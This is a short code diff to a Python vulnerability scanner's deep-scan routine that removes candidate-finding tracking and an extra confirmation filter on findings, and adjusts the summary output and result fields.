-        _collect_finding(f, "HeaderInjection")
-    _collect_candidates(hdr_r, "HeaderInjection")
+        all_findings.append({**f, "category": "HeaderInjection"})
 
     # ── 10. FP 재검증 ─────────────────────────────────────────────────────────
     print(_t("fds_step10_fp", "\n[10/10] False Positive re-verify ({n})...").format(n=min(len(all_findings), 10)))
     from .vuln_scanner_plus import batch_fp_verify
     if all_findings:
         fp_r = _safe(batch_fp_verify, all_findings, 10)
-        final_findings = [
-            f for f in fp_r.get("confirmed_findings", all_findings)
-            if _finding_is_confirmed(f)
-        ]
+        final_findings = fp_r.get("confirmed_findings", all_findings)
         removed = fp_r.get("removed_fps", [])
     else:
         final_findings = all_findings
@@ -1523,7 +1192,6 @@ def full_deep_scan(
         f"{'═'*60}",
         _t("fds_summary_tech", "  Detected tech: {tech}").format(tech=', '.join(tech.get('technologies', [])[:5]) or '?'),
         _t("fds_summary_vulns", "  Total vulns: {n} (removed {fp} FPs)").format(n=len(final_findings), fp=len(removed)),
-        f"  Candidate/observation backlog: {len(candidate_findings)}",
         _t("fds_summary_severity", "  Severity: CRITICAL={c} HIGH={h} MEDIUM={m}").format(c=severity_map['CRITICAL'], h=severity_map['HIGH'], m=severity_map['MEDIUM']),
         "",
     ]
@@ -1542,7 +1210,6 @@ def full_deep_scan(
         "by_category": by_category,
         "severity": severity_map,
         "all_findings": final_findings,
-        "candidate_findings": candidate_findings,
         "technologies": tech.get("technologies", []),
         "scan_errors": scan_errors,
         "output": "\n".join(output_lines),
